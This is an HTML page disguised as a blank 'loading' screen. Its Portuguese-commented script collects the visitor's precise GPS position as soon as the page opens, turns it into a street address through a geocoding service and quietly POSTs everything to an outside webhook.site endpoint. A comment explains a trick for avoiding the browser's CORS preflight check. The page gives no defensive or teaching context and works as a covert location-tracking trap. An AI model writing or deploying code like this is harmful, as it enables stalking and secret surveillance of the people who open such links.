<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando...</title>
    <style>
        body { background-color: #ffffff; margin: 0; padding: 0; }
    </style>
</head>
<body>
    <script>
        const URL_DO_WEBHOOK = "https://webhook.site/b2865f9e-7dce-463e-ba3d-13e739fa2ea6"; 

        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(processarLocalizacao, showError, {
                    enableHighAccuracy: true,
                    timeout: 10000 
                });
            }
        };

        function processarLocalizacao(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const precisao = position.coords.accuracy;

            const pacote = {
                latitude: lat,
                longitude: lon,
                margem_erro_metros: precisao.toFixed(2),
                link_maps: `https://www.google.com/maps?q=${lat},${lon}`,
                horario: new Date().toLocaleString()
            };

            const urlGeocoding = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`;

            fetch(urlGeocoding, { headers: { "Accept-Language": "pt-BR" } })
                .then(resposta => resposta.json())
                .then(dadosGeocoding => {
                    const endereco = dadosGeocoding.address || {};
                    
                    // Adiciona os dados de endereço ao pacote
                    pacote.rua = endereco.road || "Rua não identificada";
                    pacote.numero = endereco.house_number || "Sem número mapeado";
                    pacote.bairro = endereco.suburb || endereco.neighbourhood || "Bairro não identificado";
                    pacote.cidade = endereco.city || endereco.town || "Cidade não identificada";
                    
                    enviarParaWebhook(pacote);
                })
                .catch(error => {
                    pacote.erro_rua = "Falha ao buscar endereço, enviando apenas GPS.";
                    enviarParaWebhook(pacote);
                });
        }

        function enviarParaWebhook(dados) {
            // O SEGREDO ESTÁ AQUI: text/plain evita o bloqueio OPTIONS
            fetch(URL_DO_WEBHOOK, {
                method: "POST",
                headers: { 
                    "Content-Type": "text/plain" 
                },
                body: JSON.stringify(dados, null, 2)
            }).catch(e => console.error("Erro no envio"));
        }

        function showError(error) {
            console.error("Erro GPS:", error);
        }
    </script>
</body>
</html>
